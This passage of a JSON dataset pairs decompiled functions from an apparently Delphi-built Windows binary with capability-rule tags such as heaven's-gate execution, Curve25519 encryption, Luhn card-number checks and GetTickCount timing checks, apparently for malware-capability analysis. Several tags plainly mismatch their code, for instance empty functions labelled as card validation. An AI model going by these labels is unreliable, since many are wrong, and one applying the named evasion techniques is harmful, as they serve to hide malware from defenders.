iVar1 = 0x44;\n        break;\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n    case 0x4b:\n        *(param_1 + 4) = 0x17;\n        iVar1 = 0x48;\n        break;\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n        *(param_1 + 4) = 0x18;\n        iVar1 = 0x4c;\n        break;\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n        *(param_1 + 4) = 0x19;\n        iVar1 = 0x50;\n        break;\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n        *(param_1 + 4) = 0x1a;\n        iVar1 = 0x54;\n        break;\n    case 0x58:\n    case 0x59:\n    case 0x5a:\n    case 0x5b:\n        *(param_1 + 4) = 0x1b;\n        iVar1 = 0x58;\n        break;\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n    case 0x5f:\n        *(param_1 + 4) = 0x1c;\n        iVar1 = 0x5c;\n        break;\n    case 0x60:\n        *(param_1 + 4) = 0x1d;\n        iVar1 = 0x60;\n        break;\n    case 0x61:\n        *(param_1 + 4) = 0x1e;\n        iVar1 = 0x61;\n        break;\n    case 0x62:\n        *(param_1 + 4) = 0x1f;\n        iVar1 = 0x62;\n        break;\n    case 99:\n        *(param_1 + 4) = 0x20;\n        iVar1 = 99;\n        break;\n    case 100:\n        *(param_1 + 4) = 0x21;\n        iVar1 = 100;\n        break;\n    case 0x65:\n        *(param_1 + 4) = 0x22;\n        iVar1 = 0x65;\n        break;\n    case 0x66:\n        *(param_1 + 4) = 0x23;\n        iVar1 = 0x66;\n        break;\n    case 0x67:\n        *(param_1 + 4) = 0x24;\n        iVar1 = 0x67;\n        break;\n    case 0x68:\n        *(param_1 + 4) = 0x25;\n        iVar1 = 0x68;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 1828
    },
    "00451254": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451254(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    puVar1 = *(param_2 + 8);\n    uVar2 = fcn.0040484c(puVar1[2], puVar1[1], *puVar1);\n    *(param_2 + 0xc) = uVar2 & 0x7f;\n    return;\n}\n",
        "token_count": 107
    },
    "00404aac": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404aac(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "00404f70": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.00404f70(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = param_1;\n    (*(param_2 + 5))();\n    return;\n}\n",
        "token_count": 54
    },
    "0041c530": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c530(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41c5a7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.0040700c();\n    if (param_2 != 0) {\n        iVar2 = fcn.004164f0();\n        fcn.0040700c(iVar2 + 5);\n        cVar1 = fcn.0040f980();\n        if (cVar1 == '\\0') {\n            fcn.0040700c();\n        }\n    }\n    fcn.00416c88();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41c5ae;\n    uStack24 = 0x41c5a6;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 262
    },
    "00421028": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00421028(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 49
    },
    "0045bac8": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bac8(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 0x14) + 0x5b) - 1U < 2) {\n        fcn.0045b950(&stack0xfffffffc);\n        fcn.004321c4();\n        cVar1 = fcn.004322cc();\n        if (cVar1 == '\\0') {\n            fcn.0045b9e4(arg_8h[3] + -2, &stack0xfffffffc);\n            fcn.0045b9e4(arg_8h[3] + -2, &stack0xfffffffc);\n        }\n        else {\n            fcn.0045ba6c(arg_8h[3] + -2, *arg_8h + 10, &stack0xfffffffc);\n        }\n    }\n    else {\n        fcn.0045b950(&stack0xfffffffc);\n        fcn.004321c4();\n        cVar1 = fcn.004322cc();\n        if (cVar1 == '\\0') {\n            fcn.0045b9e4(arg_8h[1] + 5, &stack0xfffffffc);\n            fcn.0045b9e4(arg_8h[1] + 8, &stack0xfffffffc);\n        }\n        else {\n            fcn.0045ba6c(arg_8h[1] + 10, (arg_8h[2] - *(in_EAX + 0x18)) + -2, &stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 388
    },
    "0046675c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046675c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 50
    },
    "004033e0": {
        "rules": [
            "generate random numbers using the Delphi LCG/d1e3669b265a4cefae2dee380548f202"
        ],
        "decompiled_code": "\nuint fcn.004033e0(void)\n\n{\n    uint32_t in_EAX;\n    \n    *0x492008 = *0x492008 * 0x8088405 + 1;\n    return in_EAX * *0x492008 >> 0x20;\n}\n",
        "token_count": 62
    },
    "0040773c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nulong fcn.0040773c(void)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(in_EAX, in_EAX);\n}\n",
        "token_count": 32
    },
    "00409740": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409740(ushort *arg_8h)\n\n{\n    uint32_t in_EAX;\n    ushort *in_ECX;\n    uint32_t in_EDX;\n    \n    *in_ECX = in_EAX / (in_EDX & 0xffff);\n    *arg_8h = in_EAX % (in_EDX & 0xffff);\n    return;\n}\n",
        "token_count": 86
    },
    "0048d16c": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048d16c(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack56 = 0x48d185;\n    fcn.004059cc();\n    uStack60 = 0x48d24a;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    uStack72 = 0x48d21d;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uVar4 = 0x104;\n    puStack56 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(0, 0x104, &fcn.0048d16c::var_ch, &fcn.0048d16c::var_10h, &fcn.0048d16c::var_14h, 0, 0x104);\n    uVar3 = 0x48d1c9;\n    iVar2 = sub.kernel32.dll_GetVolumeInformationA(uVar1);\n    if (iVar2 != 0) {\n        if (param_2 == '\\0') {\n            uVar3 = 0;\n            fcn.00409e64(var_ch);\n        }\n        else {\n            fcn.0040afa0(var_8h);\n            uVar3 = var_8h;\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    *in_FS_OFFSET = uVar4;\n    fcn.00405530(0x48d251);\n    return;\n}\n",
        "token_count": 486
    },
    "00403d30": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00403d30(void)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        uVar1 = fcn.00403bcc();\n        if (uVar1 == '\\n') {\n            return;\n        }\n        if (uVar1 >> 8 == '\\x1a') break;\n        if (uVar1 == '\\r') {\n            uVar1 = fcn.00403bcc();\n            if ((uVar1 == '\\n') || (uVar1 >> 8 == '\\x1a')) {\n                return;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00406018": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00406018(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00406018();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405fe8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x496008 != NULL) {\n                (**0x496008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar3 = param_1 + -1;\n        bVar2 = 0 < param_1;\n        param_1 = iVar3;\n    } while (iVar3 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 509
    },
    "00406208": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00406208(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar6;\n    \n    puVar6 = *(param_1 + 1) + 10 + param_1;\n    iVar5 = puVar6[-1];\n    iVar4 = 0;\n    iVar2 = puVar6[-2];\n    do {\n        if (iVar4 < puVar6[1]) {\n            fcn.004030fc();\n        }\n        pcVar3 = **puVar6;\n        cVar1 = *pcVar3;\n        if (cVar1 == '\\n') {\n            fcn.00405584();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\v') {\n            fcn.00405d64();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\f') {\n            fcn.004061f0();\n            iVar4 = 0x10;\n        }\n        else if (cVar1 == '\\r') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 6);\n            fcn.00406324(iVar4, *(pcVar3 + pcVar3[1] + 2));\n        }\n        else if (cVar1 == '\\x0e') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 2);\n            fcn.00406208();\n        }\n        else if (cVar1 == '\\x0f') {\n            fcn.00407024();\n            iVar4 = 4;\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x496008 != NULL) {\n                    (**0x496008)(unaff_EDI, unaff_ESI);\n                }\n                fcn.00402ff8();\n                return;\n            }\n            fcn.00406970();\n            iVar4 = 4;\n        }\n        iVar4 = iVar4 + puVar6[1];\n        puVar6 = puVar6 + 2;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    if (iVar4 < iVar2) {\n        fcn.004030fc();\n    }\n    return;\n}\n",
        "token_count": 551
    },
    "00406324": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __thiscall fcn.00406324(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = *param_1;\n    if (cVar1 == '\\n') {\n        do {\n            fcn.00405584();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\v') {\n        do {\n            fcn.00405d64();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.004061f0();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00406324();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00406208();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00407024();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x496008 != NULL) {\n                (**0x496008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n        do {\n            fcn.00406970();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 439
    },
    "0046b808": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b808(int32_t param_1, int32_t param_2)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iStack24;\n    uint32_t uStack20;\n    uint16_t *puStack16;\n    \n    uStack20 = 0xffffffff;\n    uVar2 = *(param_2 + 2);\n    iVar7 = 0;\n    iVar4 = 7;\n    iVar3 = 4;\n    if (uVar2 == 0) {\n        iVar4 = 0x8a;\n        iVar3 = 3;\n    }\n    *(param_2 + 6 + param_1 * 4) = 0xffff;\n    puStack16 = param_2 + 6;\n    iStack24 = 0;\n    uVar5 = uVar2;\n    if (-1 < param_1) {\n        do {\n            iVar7 = iVar7 + 1;\n            uVar6 = *puStack16;\n            if ((iVar4 <= iVar7) || (uVar6 != uVar5)) {\n                if (iVar7 < iVar3) {\n                    piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                    *piVar1 = *piVar1 + iVar7;\n                }\n                else if (uVar5 == 0) {\n                    if (iVar7 < 0xb) {\n                        *(in_EAX + 0xabc) = *(in_EAX + 0xabc) + 1;\n                    }\n                    else {\n                        *(in_EAX + 0xac0) = *(in_EAX + 0xac0) + 1;\n                    }\n                }\n                else {\n                    if (uVar5 != uStack20) {\n                        piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                        *piVar1 = *piVar1 + 1;\n                    }\n                    *(in_EAX + 0xab8) = *(in_EAX + 0xab8) + 1;\n                }\n                iVar7 = 0;\n                uStack20 = uVar5;\n                if (uVar6 == 0) {\n                    iVar4 = 0x8a;\n                    iVar3 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar4 = 6;\n                    iVar3 = 3;\n                }\n                else {\n                    iVar4 = 7;\n                    iVar3 = 4;\n                }\n            }\n            iStack24 = iStack24 + 1;\n            puStack16 = puStack16 + 2;\n            uVar5 = uVar6;\n        } while (iStack24 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 648
    },
    "0046b914": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046b914(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iStack48;\n    uint32_t uStack44;\n    uint16_t *puStack20;\n    \n    iVar7 = 4;\n    iVar2 = 7;\n    uStack44 = 0xffffffff;\n    if (*(param_2 + 2) == 0) {\n        iVar2 = 0x8a;\n        iVar7 = 3;\n    }\n    iStack48 = 0;\n    puStack20 = param_2 + 6;\n    iVar3 = 0;\n    uVar5 = *(param_2 + 2);\n    if (-1 < param_1) {\n        do {\n            iVar4 = iVar3 + 1;\n            uVar6 = *puStack20;\n            if ((iVar2 <= iVar4) || (uVar6 != uVar5)) {\n                if (iVar4 < iVar7) {\n                    do {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                    } while (iVar4 != 0);\n                }\n                else if (uVar5 == 0) {\n                    if (iVar4 < 0xb) {\n                        uVar8 = *(in_EAX + 0xabe);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xabc);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xabc) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 0xe) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 2U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 2U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n                        }\n                    }\n                    else {\n                        uVar8 = *(in_EAX + 0xac2);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xac0);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xac0) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 10) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -0xb << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 7;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 10U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 10U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -9;\n                        }\n                    }\n                }\n                else {\n                    if (uVar5 != uStack44) {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        iVar4 = iVar3;\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                    }\n                    uVar8 = *(in_EAX + 0xaba);\n                    if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                        uVar1 = *(in_EAX + 0xab8);\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xab8) << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                    }\n                    if (*(in_EAX + 0x16b8) < 0xf) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 2;\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 - 3U << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (iVar4 - 3U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xe;\n                    }\n                }\n                iVar4 = 0;\n                uStack44 = uVar5;\n                if (uVar6 == 0) {\n                    iVar2 = 0x8a;\n                    iVar7 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar2 = 6;\n                    iVar7 = 3;\n                }\n                else {\n                    iVar2 = 7;\n                    iVar7 = 4;\n                }\n            }\n            iStack48 = iStack48 + 1;\n            puStack20 = puStack20 + 2;\n            iVar3 = iVar4;\n            uVar5 = uVar6;\n        } while (iStack48 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 3796
    },
    "00484d64": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00484d64(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX == 8) {\n        fcn.00405584();\n        return;\n    }\n    if (in_EAX == 0xd) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 0x18) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 10) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 6) {\n        fcn.00405584();\n    }\n    else if (in_EAX == 4) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "00403ec4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
